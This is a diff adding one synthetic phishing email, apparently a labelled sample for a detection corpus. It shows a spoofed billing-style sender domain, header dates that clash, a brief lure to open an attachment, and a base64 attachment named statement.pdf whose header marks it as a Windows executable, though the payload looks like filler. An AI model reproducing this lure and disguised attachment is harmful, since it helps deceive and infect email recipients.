@@ -1,0 +1,45 @@
+From: notice@netflix-billing.shop
+To: victim41@example.com
+Subject: Meeting notes for the west power desk [ref AE27D59]
+Date: Tue, 22 Mar 2002 08:59:00 -0500
+Message-ID: <phish-41-57655e6d-646f-486e-8e6a-08221499c90a@netflix-billing.shop>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 26 Mar 2002 14:16:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 12 Mar 2002 08:37:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 22 Mar 2002 04:17:00 -0500
+Return-Path: <notice@netflix-billing.shop>
+Reply-To: notice@netflix-billing.shop
+Authentication-Results: mx.example.com; spf=pass smtp.mailfrom=netflix-billing.shop; dkim=pass header.d=netflix-billing.shop; dmarc=pass header.from=netflix-billing.shop
+Received-SPF: pass (mx.example.com: domain of notice@netflix-billing.shop designates 192.0.2.21 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=netflix-billing.shop; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="bnd-p-41-dce5bdda"
+
+--bnd-p-41-dce5bdda
+Content-Type: text/plain; charset="UTF-8"
+
+Hi,
+
+Please review the attached schedule before Friday. No action needed beyond that.
+Reference: AE27D59
+
+Thanks,
+Colleague
+--bnd-p-41-dce5bdda
+Content-Type: application/pdf; name="statement.pdf"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="statement.pdf"
+
+TVqQAGH0KGwT8OLL915cTb71zMilWiVi8RzsjUTrAftSA8ciZ78mX+mMpn5LonoRaUf00qCYE87u
+Rv8z39rm1OOSoW39FMyGg/PfBPs8mkGpmX6LskLbqxghVfjYPICKiNyClMM7KusA06fhAuWo9gLm
+CNYjAeTEFYu/cmi41BfxOjHqQtji65g0m2mdjvFt/2zhd+o/TATZnbkb2rrb1EEv7+OF21sxq2LE
+8mHh3GiPamCULvJKP8d53KhfTbi1T5GzsyRF+WiPvkRfa6JDYNTVrKKCdc3x1jVm2Tc4zJ2T8Reg
+TTXFJqrlU2Yjk+EZxJZwNU/03HI3bE9esbUoRDHKdHc20SCUSscEKhk4ZQJEwPo5+uovMATpZEF9
+cdtAreilrot46UnIEGGWbxqe+hZSRx03LIxRdf74V9Yrmp/GmACrVMqi5G6ASAZe8kPqOfCAWRsG
+VF0U75o9/4xNnfET8bfG/BjanZShtk1K27MkImHrVe7bWH4KXluVr/Tz+bDMGJIDAQHEIld8/wpC
+/3GWCjMvQ/TXItYtczjaY0FKT0fYJwoXT4tHo0tXfUZfYN3Guq+fQZCM6a06B+VpClyPIK1kvjdb
+1z4j/ipA6VDJKzNpgDS04aveJHJx2sbUxT1zlEfl9Qj+lz/pr6e5ivKfYZ8Ayd7Spuz8G9w5iNdq
+hT6NC9Ey/NRKWL0BD8Y1woFbtA+2awuynEQaoH1Bx2RpiwM7FixB7DRIJzKmvG3kB5lqD3xlS2wi
+y//aQZdB+PTPYD8akKGqba7Edh6Pp0cc5b2UbLLROtU5QY+mtz49sfJE2vb/R5MCgdfo1k5ohqUq
+p1DfSkIsTsaNp14iNA==
+
+--bnd-p-41-dce5bdda--
